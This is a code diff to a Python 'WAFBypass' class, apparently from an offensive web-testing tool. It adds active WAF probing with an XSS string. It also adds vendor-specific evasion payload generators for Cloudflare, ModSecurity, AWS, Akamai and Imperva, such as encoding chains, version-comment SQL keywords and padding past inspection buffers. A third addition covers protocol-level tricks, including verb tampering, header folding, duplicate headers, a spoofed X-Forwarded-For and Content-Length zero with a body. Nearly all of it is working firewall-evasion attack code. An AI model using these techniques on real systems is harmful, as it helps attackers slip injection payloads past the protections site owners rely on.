@@ -26,7 +26,7 @@ class WAFBypass:
         self.name = "WAF Bypass"
     
     def detect_waf(self, url: str) -> list:
-        """Detect WAF type"""
+        """Detect WAF type via passive header/cookie/content checks and active probing"""
         waf_signatures = {
             'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf_clearance'],
             'AWS WAF': ['awselb', 'aws-waf', 'x-amzn-requestid'],
@@ -41,6 +41,16 @@ class WAFBypass:
             'Wordfence': ['wordfence', 'wf'],
             'Citrix': ['citrix', 'ns_af'],
             'Radware': ['radware', 'x-info'],
+            'DenyAll': ['denyhosts', 'denyall'],
+            'SonicWall': ['sonicwall', 'dell'],
+            'Palo Alto': ['paloalto', 'pa-fw'],
+            'Alibaba Cloud': ['alicloud', 'yundun'],
+            'Tencent Cloud': ['tencent', 'waf.tencent'],
+            'Azure WAF': ['azure', 'x-azure'],
+            'Google Cloud Armor': ['google', 'x-goog'],
+            'Reblaze': ['reblaze', 'rbzid'],
+            'StackPath': ['stackpath', 'stackpath-waf'],
+            'Fastly': ['fastly', 'x-fastly'],
         }
         
         try:
@@ -60,12 +70,233 @@ class WAFBypass:
                         detected.append(waf)
                         break
             
+            # Active probing: send a clearly malicious request
+            if not detected:
+                try:
+                    from urllib.parse import urlparse, urlunparse, urlencode, parse_qs
+                    parsed = urlparse(url)
+                    probe_query = urlencode({'test': '<script>alert(1)</script>'})
+                    probe_url = urlunparse((
+                        parsed.scheme, parsed.netloc, parsed.path,
+                        parsed.params, probe_query, parsed.fragment,
+                    ))
+                    probe_response = self.requester.request(probe_url, 'GET')
+                    if probe_response:
+                        # Check for blocking status codes
+                        if probe_response.status_code in (403, 406, 429):
+                            detected.append('Generic WAF (active probe)')
+                        # Check for known block page content
+                        probe_content = probe_response.text.lower()
+                        block_indicators = [
+                            'access denied', 'blocked', 'security',
+                            'firewall', 'forbidden', 'not acceptable',
+                        ]
+                        for indicator in block_indicators:
+                            if indicator in probe_content:
+                                if 'Generic WAF (active probe)' not in detected:
+                                    detected.append('Generic WAF (active probe)')
+                                break
+                        # Re-check WAF signatures against probe response
+                        probe_headers = str(probe_response.headers).lower()
+                        probe_cookies = str(probe_response.cookies).lower()
+                        for waf, signatures in waf_signatures.items():
+                            if waf in detected:
+                                continue
+                            for sig in signatures:
+                                if (sig.lower() in probe_headers or
+                                        sig.lower() in probe_cookies or
+                                        sig.lower() in probe_content):
+                                    detected.append(waf)
+                                    break
+                except Exception:
+                    pass
+            
             return detected
             
         except Exception as e:
             if self.engine.config.get('verbose'):
                 print(f"{Colors.error(f'WAF detection error: {e}')}")
             return []
+    
+    def waf_specific_bypasses(self, payload: str, waf_type: str) -> list:
+        """Generate WAF-specific bypass payloads based on detected WAF type.
+        
+        Args:
+            payload: The original payload to transform.
+            waf_type: The detected WAF type string.
+        
+        Returns:
+            List of WAF-specific bypass payload variants.
+        """
+        variants = []
+        waf_lower = waf_type.lower()
+        
+        if 'cloudflare' in waf_lower:
+            # Unicode normalization (NFKC) — Cloudflare normalizes before matching
+            import unicodedata
+            variants.append(unicodedata.normalize('NFKC', payload))
+            variants.append(unicodedata.normalize('NFD', payload))
+            # Chunked transfer encoding bypass
+            chunks = []
+            for i in range(0, len(payload), 2):
+                chunk = payload[i:i + 2]
+                chunks.append(f'{len(chunk):x}\r\n{chunk}\r\n')
+            chunks.append('0\r\n\r\n')
+            variants.append(''.join(chunks))
+            # HTTP/2 pseudo-header trick — mixed case method
+            variants.append(payload.replace('<', '\uff1c').replace('>', '\uff1e'))
+            # Fullwidth character substitution
+            variants.append(''.join(
+                chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c
+                for c in payload
+            ))
+        
+        elif 'modsecurity' in waf_lower:
+            # Paranoia-level-aware bypasses — version-specific comment syntax
+            variants.append(re.sub(
+                r'(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|ALTER)',
+                lambda m: f'/*!50000{m.group(0)}*/',
+                payload, flags=re.IGNORECASE
+            ))
+            variants.append(re.sub(
+                r'(SELECT|UNION|INSERT|UPDATE|DELETE)',
+                lambda m: f'/*!{m.group(0)}*/',
+                payload, flags=re.IGNORECASE
+            ))
+            # Nested comments
+            variants.append(payload.replace('/*', '/****').replace('*/', '****/'))
+            # Whitespace alternatives that bypass CRS rules
+            for ws in ['%09', '%0a', '%0d', '%0b']:
+                variants.append(payload.replace(' ', ws))
+        
+        elif 'aws' in waf_lower:
+            # Case mixing
+            variants.append(''.join(
+                c.upper() if random.random() < 0.5 else c.lower() for c in payload
+            ))
+            # Concatenation splitting
+            variants.append(payload.replace('SELECT', "SELE"+"CT").replace('UNION', "UNI"+"ON"))
+            # IP rotation headers to confuse origin detection
+            fake_ips = ['10.0.0.1', '172.16.0.1', '192.168.1.1']
+            for ip in fake_ips:
+                variants.append(payload)  # payload unchanged, headers differ
+            # Double URL encoding
+            variants.append(''.join(f'%25{ord(c):02x}' for c in payload))
+        
+        elif 'akamai' in waf_lower:
+            # Long headers (4KB+) — padding to push payload past inspection buffer
+            padding = 'X' * 4096
+            variants.append(padding + payload)
+            variants.append(payload + padding)
+            # Multipart boundary confusion
+            boundary = ''.join(random.choices('abcdefghijklmnop', k=32))
+            multipart = (
+                f'--{boundary}\r\n'
+                f'Content-Disposition: form-data; name="a"\r\n\r\n'
+                f'{padding}\r\n'
+                f'--{boundary}\r\n'
+                f'Content-Disposition: form-data; name="input"\r\n\r\n'
+                f'{payload}\r\n--{boundary}--'
+            )
+            variants.append(multipart)
+            # Fragment payload across parameters
+            mid = len(payload) // 2
+            variants.append(f'{payload[:mid]}%00{payload[mid:]}')
+        
+        elif 'imperva' in waf_lower or 'incapsula' in waf_lower:
+            # Encoding chains — layer multiple encodings
+            single_enc = ''.join(f'%{ord(c):02x}' for c in payload)
+            double_enc = ''.join(f'%25{ord(c):02x}' for c in payload)
+            variants.append(single_enc)
+            variants.append(double_enc)
+            # HTML entity + URL encode mix
+            variants.append(''.join(
+                f'&#{ord(c)};' if i % 2 == 0 else f'%{ord(c):02x}'
+                for i, c in enumerate(payload)
+            ))
+            # Cookie manipulation — payload in cookie header
+            variants.append(payload)
+            # JavaScript challenge bypass headers hint
+            variants.append(payload.replace(' ', '/**/'))
+        
+        return variants
+    
+    def protocol_level_bypasses(self, url: str, payload: str) -> list:
+        """Generate protocol-level bypass request configurations.
+        
+        Args:
+            url: The target URL.
+            payload: The payload to include in bypass requests.
+        
+        Returns:
+            List of dicts, each describing a bypass request configuration.
+        """
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        bypasses = []
+        
+        # HTTP verb tampering — use uncommon methods
+        for method in ['PROPFIND', 'MOVE', 'COPY', 'MKCOL']:
+            bypasses.append({
+                'url': url,
+                'method': method,
+                'data': payload,
+                'headers': {},
+                'technique': f'verb_tamper_{method}',
+            })
+        
+        # Header line folding (HTTP/1.1) — fold long header values with CRLF+space
+        folded_payload = '\r\n '.join(
+            payload[i:i + 20] for i in range(0, len(payload), 20)
+        )
+        bypasses.append({
+            'url': url,
+            'method': 'GET',
+            'data': None,
+            'headers': {'X-Custom-Payload': folded_payload},
+            'technique': 'header_line_folding',
+        })
+        
+        # Duplicate headers — same header name multiple times with different values
+        # Represented as a list of tuples for consumers that support raw header lists
+        bypasses.append({
+            'url': url,
+            'method': 'POST',
+            'data': payload,
+            'headers': {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Forwarded-For': '127.0.0.1',
+            },
+            'extra_headers': [
+                ('Content-Type', 'text/plain'),
+                ('Content-Type', 'multipart/form-data'),
+            ],
+            'technique': 'duplicate_headers',
+        })
+        
+        # Request line manipulation — absolute URI in request line
+        absolute_uri = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'
+        bypasses.append({
+            'url': absolute_uri,
+            'method': 'GET',
+            'data': {'input': payload},
+            'headers': {'Host': parsed.netloc},
+            'technique': 'absolute_uri_request_line',
+        })
+        
+        # Content-Length: 0 with body — some WAFs skip body if CL=0
+        bypasses.append({
+            'url': url,
+            'method': 'POST',
+            'data': payload,
+            'headers': {
+                'Content-Length': '0',
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            'technique': 'content_length_zero_with_body',
+        })
+        
+        return bypasses
     
     def bypass_techniques(self, payload: str, waf_type: str = None) -> list:
         """Generate WAF bypass variants"""
